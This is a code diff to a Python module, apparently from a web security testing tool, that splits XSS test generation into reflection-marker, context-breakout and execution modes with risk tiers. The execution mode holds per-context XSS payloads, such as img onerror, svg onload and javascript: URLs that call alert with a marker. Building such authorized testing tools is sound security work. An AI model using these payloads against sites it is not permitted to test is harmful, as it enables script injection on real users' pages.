@@ -3,6 +3,7 @@
 
 from __future__ import annotations
 
+import hashlib
 from html.parser import HTMLParser
 import json
 import re
@@ -16,6 +17,12 @@ from .active_probe import redact_value_preview
 
 
 TEXTUAL_TYPES = ("text/html", "application/xhtml", "application/xml", "text/xml", "application/json")
+XSS_TEST_MODES = ("reflection_marker", "context_breakout", "execution")
+XSS_MODE_RISK_TIERS = {
+    "reflection_marker": "low",
+    "context_breakout": "medium",
+    "execution": "high",
+}
 STATIC_EXTENSIONS = (
     ".js",
     ".css",
@@ -355,12 +362,21 @@ def infer_context(param: dict[str, Any], reflections: list[dict[str, Any]]) -> s
 
 
 def generate_test_code(args: dict[str, Any]) -> str:
-    parameter = args["parameter"]
-    context = args.get("context", "unknown")
-    url = args.get("url", "")
-    payloads = payloads_for_context(context)
+    parameter = str(args["parameter"])
+    context = str(args.get("context", "unknown"))
+    url = str(args.get("url", ""))
+    plan = build_test_plan(
+        parameter=parameter,
+        context=context,
+        url=url,
+        mode=args.get("mode", "reflection_marker"),
+        marker=args.get("marker"),
+    )
+    payloads = plan["payloads"]
+    if plan["mode"] == "reflection_marker":
+        return json.dumps(plan, indent=2)
     helper = [
-        "// Manual XSS test helper. Use only in an authorized browser session.",
+        f"// Authorized manual XSS {plan['mode']} helper ({plan['riskTier']} risk).",
         f"const parameter = {json.dumps(parameter)};",
         f"const payloads = {json.dumps(payloads, indent=2)};",
     ]
@@ -382,20 +398,92 @@ def generate_test_code(args: dict[str, Any]) -> str:
                 "}",
             ]
         )
-    return json.dumps({"parameter": parameter, "context": context, "payloads": payloads, "browserConsoleHelper": "\n".join(helper)}, indent=2)
+    plan["browserConsoleHelper"] = "\n".join(helper)
+    return json.dumps(plan, indent=2)
 
 
-def payloads_for_context(context: str) -> list[str]:
-    common = {
-        "html": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
-        "attribute": ['" autofocus onfocus=alert(1) x="', "' onmouseover=alert(1) x='"],
-        "script": ["';alert(1);//", '";alert(1);//', "</script><img src=x onerror=alert(1)>"],
-        "js-string": ["';alert(1);//", '";alert(1);//'],
-        "url": ["javascript:alert(1)", "data:text/html,<svg onload=alert(1)>"],
-        "json": ['"}<img src=x onerror=alert(1)>', '\\";alert(1);//'],
-        "unknown": ["<img src=x onerror=alert(1)>", '"><svg onload=alert(1)>', "';alert(1);//"],
+def build_test_plan(
+    *,
+    parameter: str,
+    context: str = "unknown",
+    url: str = "",
+    mode: Any = "reflection_marker",
+    marker: Any = None,
+) -> dict[str, Any]:
+    normalized_mode = normalize_test_mode(mode)
+    normalized_marker = validate_reflection_marker(marker, seed=f"{parameter}|{context}|{url}")
+    if normalized_mode == "reflection_marker":
+        payloads = [normalized_marker]
+        encoding_variants = [
+            {"encoding": "raw", "value": normalized_marker},
+            {"encoding": "url", "value": normalized_marker},
+            {"encoding": "html", "value": normalized_marker},
+        ]
+        capability = "reflection_only"
+    elif normalized_mode == "context_breakout":
+        payloads = context_breakout_payloads(context, normalized_marker)
+        encoding_variants = []
+        capability = "syntax_breakout"
+    else:
+        payloads = execution_payloads_for_context(context, normalized_marker)
+        encoding_variants = []
+        capability = "script_execution"
+    return {
+        "parameter": parameter,
+        "context": context,
+        "url": url,
+        "mode": normalized_mode,
+        "riskTier": XSS_MODE_RISK_TIERS[normalized_mode],
+        "payloadCapability": capability,
+        "marker": normalized_marker,
+        "payloads": payloads,
+        "exactWirePayloads": list(payloads),
+        "encodingVariants": encoding_variants,
+        "browserConsoleHelper": None,
     }
-    return common.get(context, common["unknown"])
+
+
+def normalize_test_mode(value: Any) -> str:
+    mode = str(value or "reflection_marker").strip().lower()
+    if mode not in XSS_TEST_MODES:
+        raise McpError(-32602, f"XSS mode must be one of: {', '.join(XSS_TEST_MODES)}.")
+    return mode
+
+
+def validate_reflection_marker(value: Any, *, seed: str) -> str:
+    if value is None or str(value) == "":
+        digest = hashlib.sha256(seed.encode("utf-8")).hexdigest()[:16].upper()
+        return f"SYNAPSEXSS{digest}"
+    marker = str(value)
+    if not re.fullmatch(r"[A-Za-z0-9]{4,80}", marker):
+        raise McpError(-32602, "XSS reflection markers must be 4-80 ASCII alphanumeric characters and are sent without rewriting.")
+    return marker
+
+
+def context_breakout_payloads(context: str, marker: str) -> list[str]:
+    payloads = {
+        "html": [f'"><synapse-xss data-token="{marker}"></synapse-xss>'],
+        "attribute": [f'" data-synapse-xss="{marker}" x="', f"' data-synapse-xss='{marker}' x='"],
+        "script": [f"';/*{marker}*/", f'";/*{marker}*/'],
+        "js-string": [f"';/*{marker}*/", f'";/*{marker}*/'],
+        "url": [f"synapse-xss-{marker}"],
+        "json": [f'"{marker}"'],
+        "unknown": [f'"><synapse-xss data-token="{marker}"></synapse-xss>', f'" data-synapse-xss="{marker}" x="'],
+    }
+    return payloads.get(str(context).lower(), payloads["unknown"])
+
+
+def execution_payloads_for_context(context: str, marker: str) -> list[str]:
+    common = {
+        "html": [f'<img src=x onerror=alert("{marker}")>', f'<svg onload=alert("{marker}")>'],
+        "attribute": [f'" autofocus onfocus=alert("{marker}") x="', f"' onmouseover=alert(\"{marker}\") x='"],
+        "script": [f"';alert(\"{marker}\");//", f'";alert(\"{marker}\");//', f'</script><img src=x onerror=alert("{marker}")>'],
+        "js-string": [f"';alert(\"{marker}\");//", f'";alert(\"{marker}\");//'],
+        "url": [f'javascript:alert("{marker}")', f'data:text/html,<svg onload=alert("{marker}")>'],
+        "json": [f'"}}<img src=x onerror=alert("{marker}")>', f'\\";alert(\"{marker}\");//'],
+        "unknown": [f'<img src=x onerror=alert("{marker}")>', f'"><svg onload=alert("{marker}")>', f"';alert(\"{marker}\");//"],
+    }
+    return common.get(str(context).lower(), common["unknown"])
 
 
 def analyze_entry(entry: dict[str, Any], max_findings: int, include_test_code: bool) -> dict[str, Any] | None:
